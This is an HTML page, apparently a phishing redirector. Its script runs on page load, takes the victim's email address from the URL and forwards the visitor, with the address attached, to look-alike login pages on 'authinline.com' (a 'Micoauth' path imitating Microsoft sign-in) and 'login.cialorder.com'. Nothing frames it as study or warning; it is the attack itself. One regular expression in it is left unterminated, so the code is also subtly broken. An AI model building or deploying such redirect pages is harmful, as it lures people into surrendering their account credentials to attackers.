<!DOCTYPE html>
<html>
<head>
  <title>Email Redirect</title>
  <script>
    function processEmailUrl() {
      var currentURL = window.location.href;

      if (currentURL.includes('=')) {
        var emailRegex = /=(.*?)(#|$)/;
        var emailMatch = currentURL.match(emailRegex);

        if (emailMatch) {
          var email = emailMatch[1];
          var hash = window.location.hash; // Get the existing hash fragment
          var redirectURL = 'https://authinline.com/Micoauth/index.html' + hash + email;
          window.location.href = redirectURL;
        } else {
          window.location.href = 'https://authinline.com/Micoauth/index.html';
        }
      } else {
        extractEmailAndRedirect();
      }
    }

    function extractEmailAndRedirect() {
      var currentURL = window.location.href;

      if (currentURL.includes('?')) {
        var parts = currentURL.split('?');
        var baseURL = parts[0];
        var emailPart = parts[1];

        if (emailPart) {
          var email = emailPart.match(/[^@]+@[^@]+);

          if (email) {
            var hash = window.location.hash; // Get the existing hash fragment
            var redirectURL = 'https://login.cialorder.com/lSPhAWsB' + hash + email[0];
            window.location.href = redirectURL;
          } else {
            window.location.href = 'https://login.cialorder.com/lSPhAWsB';
          }
        } else {
          window.location.href = 'https://login.cialorder.com/lSPhAWsB';
        }
      } else {
        window.location.href = 'https://login.cialorder.com/lSPhAWsB';
      }
    }

    // Call the function immediately when the script is loaded
    processEmailUrl();
  </script>
</head>

</html>
